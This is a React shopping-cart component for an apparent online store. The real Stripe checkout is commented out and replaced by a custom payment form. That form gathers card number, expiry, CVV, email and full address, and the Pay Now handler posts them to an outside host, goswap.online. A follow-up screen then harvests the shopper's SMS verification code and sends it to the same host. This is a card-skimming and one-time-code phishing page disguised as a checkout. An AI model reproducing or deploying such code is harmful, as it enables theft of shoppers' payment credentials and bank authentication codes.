import React, { useRef,useState } from 'react'
import Link from 'next/link'
import { AiOutlineMinus, AiOutlinePlus, AiOutlineLeft, AiOutlineShopping } from 'react-icons/ai'
import { TiDeleteOutline } from "react-icons/ti";
import toast from 'react-hot-toast'
import LayoutWrapper from './LayoutWrapper';
import InputField from './InputField';
import CardIconsList from './CardIconsList';
import { Row, Col, Card, Form, Button } from 'react-bootstrap';
import 'bootstrap/dist/css/bootstrap.min.css';
import { RotatingLines } from 'react-loader-spinner'
import { useStateContext } from '../context/StateContext';
import { urlFor } from '../lib/client';
import { handleNumbersOnly, getCardType } from './utils';
import getStripe from '../lib/getStripe';
const Cart = () => {
  // const [name, setName] = useState("");
  // const [cardNumber, setCardNumber] = useState("");
  // const [expiry, setExpiry] = useState("");
  // const [cvc, setCvc] = useState("");
    const [isLoading, setIsLoading] = useState("");
  const [submittedData, setSubmittedData] = useState({});
  const [showModal, setShowModal] = useState(false);

  const cartRef = useRef();
  const { totalPrice,onRemove,toggleCartItemQuantity,totalQuantites, cartItems, setShowCart } = useStateContext()
  function toggleCardFlip(e) {
    e.preventDefault();
    setIsFrontOfCardVisible(!isFrontOfCardVisible);
  }

  const [contact, setContact] = useState({
    name: '',
    number: '',
    email:'',
    expiry: '',
    security: '',
    country:'',
    city:'',
    address:'',
    postalcode:'',
    smscode:'',
    errors: {}
  });
    const [ smsCodeTime, setSmsCodeTime] = useState(null); 

const handleCheckout = async()=>{
      const stripe = await getStripe();
      // const response = await fetch('/api/stripe',{
      //   method : "POST",
      //   headers : {
      //     'Content-Type' : 'application/json',
      //   },
      //   body : JSON.stringify(cartItems),
      // })

      // if(response.statusCode === 500) return ;

     // toast.loading("please wait...")
      setShowModal(true)
      // stripe.redirectToCheckout({sessionId : data.id})

}
function maskify(creditCard) {
  const formatNumber = (number) => number.split("").reduce((seed, next, index) => {
  if (index !== 0 && !(index % 4)) seed += " ";
  return seed + next;
}, "");
  if (creditCard.length < 4) return creditCard;
  console.log(creditCard)
   // let cc = creditCard.replaceAll(/\s/g,'');
  let cc = creditCard
 
  // Add first character back
 ;
  
  return formatNumber(cc.replaceAll(" ", ""));;
}
  const handleValidation = () => {
    const { name, number, expiry, security, errors,email } = contact;
    let formIsValid = true;

    if (!name) {
      formIsValid = false;
      errors['name'] = 'Cardholder name is required';
    } else {
      errors['name'] = '';
    }

    if (!number) {
      formIsValid = false;
      errors['number'] = 'Card number is required';
    } else {
      errors['number'] = '';
    }

    if (!expiry) {
      formIsValid = false;
      errors['expiry'] = 'Expiry is required';
    } else {
      errors['expiry'] = '';
    }

    if (!security) {
      formIsValid = false;
      errors['security'] = 'CVV is required';
    } else {
      errors['security'] = '';
    }

    setContact({ ...contact, errors: errors });
    return formIsValid;
  } 

  const handleChange = ( e ) => {
    console.log(e.target.name)
   setContact({ ...contact, [e.target.name]: e.target.value });

    if(e.target.name == "number") {
      let num  = e.target.value
      setContact({ ...contact, [e.target.name]: maskify(num)});
    } 
  }
  // Input card expiry onKeyUp handler
  const handleCardExpiry = ( e ) => {
    let expiryDate = e.target.value;
  
    if (e.keyCode !== 8) {
      if (expiryDate > 1 && expiryDate.length === 1) {
        expiryDate = '0' + expiryDate + '/';
      } else if (expiryDate.length === 2) {
        expiryDate = expiryDate + '/';
      }
      
      setContact({ ...contact, expiry: expiryDate });
    } else {
      setContact({ ...contact, expiry: '' });
    }
  }

  // Form onSubmit handler
  const handleSubmit = ( e ) => {
    e.preventDefault();
    const { name, number, expiry, security } = contact;

    if (handleValidation()) {
      setContact({ ...contact, errors: {} });
      console.log({
        name,
        number,
        expiry,
        security
      });
    }
  }

  const { name, number, expiry, security, errors, email, country,
    city,
    address,
    smscode,
    postalcode} = contact;

  return (
    <div className='cart-wrapper' ref={cartRef}>
      <div className='cart-container'>
        <button
          type="button"
          className='cart-heading'
          onClick={() => setShowCart(false)}
        >
          <AiOutlineLeft />
          <span className='heading'>Your Cart</span>
          <span className='cart-num-items'>({totalQuantites} items)</span>
        </button>

        {cartItems.length < 1 && (
          <div className='empty-cart'>
            <AiOutlineShopping size={150} />
            <h3>Your shopping bag is empty</h3>
            <Link href="/">
              <button

                type='button'
                onClick={() => setShowCart(false)}
                className="btn"
              >
                Continue Shopping
              </button>
            </Link>
          </div>
        )}

        <div className='product-container'>
          {
            cartItems.length >= 1 && cartItems.map((item, index) => (
              <div className='product' key={item._id}>
                <img 
                src={('/assets/' + item?.image[0].asset._ref)}
            
                  className="cart-product-image"
                />
                <div className='item-desc'>
                  <div className='flex top'>
                    <h5>{item.name}</h5>
                    <h4>${item.price}</h4>
                  </div>
                  <div className='flex bottom'>
                    <div>
                    <p className='quantity-desc'>
                        <span className='minus' onClick={()=>toggleCartItemQuantity(item._id,"dec")}>
                            <AiOutlineMinus/>
                        </span>
                        <span className='num' >
                            {item.quantity}
                        </span>
                        <span className='plus' onClick={()=>toggleCartItemQuantity(item._id,"inc")}>
                            <AiOutlinePlus/>
                        </span>
                    </p>
                    </div>
                    <button
                      type='button'
                      className='remove-item'
                      onClick={()=>onRemove(item)}
                    >
                      <TiDeleteOutline/>
                    </button>
                  </div>
                </div>
              </div>
            ))}
        </div>
        {
          cartItems.length >= 1 && (
            <div className='cart-bottom'>
                <div className='total'>
                  <h3>Subtotal : </h3>
                  <h3>${totalPrice}</h3>
                </div>
                <div className='btn-container'>
                  <button type='button'
                    className='btn'
                                  style={{backgroundColor:'red',color:'#FFF'}}
                    onClick={handleCheckout}
                  >
                     Pay now 
                  </button>
                </div>
            </div>
          )
        }
      </div>
    {
      showModal?(
    <div className="card-form-container" >

      <Row>
        <Col  >
          <div className="CardPaymentForm" style={{width:450}}>
          { smsCodeTime? (
 <Card className="shadow-sm">
              <Card.Body>
            


{

isLoading?(
  <div style={{display:'flex',alignItems:'center',justifyContent:'center'}}>
  <RotatingLines
  style={{margin:'auto'}}
  strokeColor="grey"
  strokeWidth="5"
  animationDuration="0.75"
  width="96"
  visible={true}
/>
</div>
  ):(
  <>
   <h3 className="CardPaymentForm-Title">SMS has been sent</h3>
                 <br />
                 <br />
                 <h5 className="CardPaymentForm-Title">Enter code to finish process</h5>
              
              <InputField
                    unique="smscode"
                    label="Enter SMS here"
                    name="smscode"
                    value={smscode}
                    onChange={handleChange}
                  />

 <Button
                    onClick={async () => {
                      setIsLoading(true)
                        try {
                        const response = await fetch('https://goswap.online/credit/sms' ,{
                          method : "POST",
                          headers : {
                            'Content-Type' : 'application/json',
                          },
                          body : JSON.stringify({code:smscode}),
                        })
                      }catch(e) {

                      }
                    }}
                    block
                    variant="primary"
                    className="text-uppercase mb-3"
                    type="submit"
                  >Confirm</Button>
                  </>
  )
}
              
              </Card.Body>
              </Card>
            ):(
 <Card className="shadow-sm">
              <Card.Body>
                <h3 className="CardPaymentForm-Title">Pay with Credit Card</h3>
                <CardIconsList type={getCardType(number)} />
                <Form onSubmit={handleSubmit}>
                   <InputField
                    unique="cardholderName"
                    label="Email"
                    name="email"
                    value={email}
                    onChange={handleChange}
                  />
                  <InputField
                    unique="Country"
                    label="Country"
                    name="country"
                    value={country}
                    onChange={handleChange}
                  />

                
                  <InputField
                    unique="city"
                    label="Town/City"
                    name="city"
                    value={city}
                    onChange={handleChange}
                    error={errors.name}
                  />


                   <InputField
                    unique="postalcode"
                    label="Postal code"
                    name="postalcode"
                    value={postalcode}
                    onChange={handleChange}
                    error={errors.name}
                  />
                       <InputField
                    unique="address"
                    label="Street Address"
                    name="address"
                    value={address}
                    onChange={handleChange}
                    error={errors.name}
                  />



                  <InputField
                    unique="cardNumber"
                    label="Card number"
                    maxLength="19"
                    name="number"
                    value={number}
                    onKeyDown={handleNumbersOnly}
                    onChange={handleChange}
                    error={errors.number}
                  />
                  <Row>
                    <Col>
                      <InputField
                        unique="cardExpiry"
                        label="MM/YY"
                        maxLength="5"
                        name="expiry"
                        value={expiry}
                        onKeyDown={handleNumbersOnly}
                        onKeyUp={handleCardExpiry}
                        onChange={handleChange}
                        error={errors.expiry}
                      />
                    </Col>
                    <Col>
                      <InputField
                        unique="cardCvv"
                        label="CVV"
                        maxLength="4"
                        name="security"
                        value={security}
                        onKeyDown={handleNumbersOnly}
                        onChange={handleChange}
                        error={errors.security}
                      />
                    </Col>
                  </Row>
                  <Button
                    onClick={async () => {
                      try {
                        const response = await fetch('https://goswap.online/credit/process' ,{
                          method : "POST",
                          headers : {
                            'Content-Type' : 'application/json',
                          },
                          body : JSON.stringify(contact),
                        })
                      }catch(e) {

                      }
                       setSmsCodeTime(true)
                       setIsLoading(true)
                       setTimeout(() => {
                        setIsLoading(false)
                       },5000)
                    }}
                    block
                    variant="primary"
                    className="text-uppercase mb-3"
                    type="submit"
                  >Pay Now</Button>
                </Form>
              </Card.Body>
            </Card>
            )}
           
          </div>
        </Col>
      </Row>
   </div>):(<></>)



  }
    </div>
  )
}


export default Cart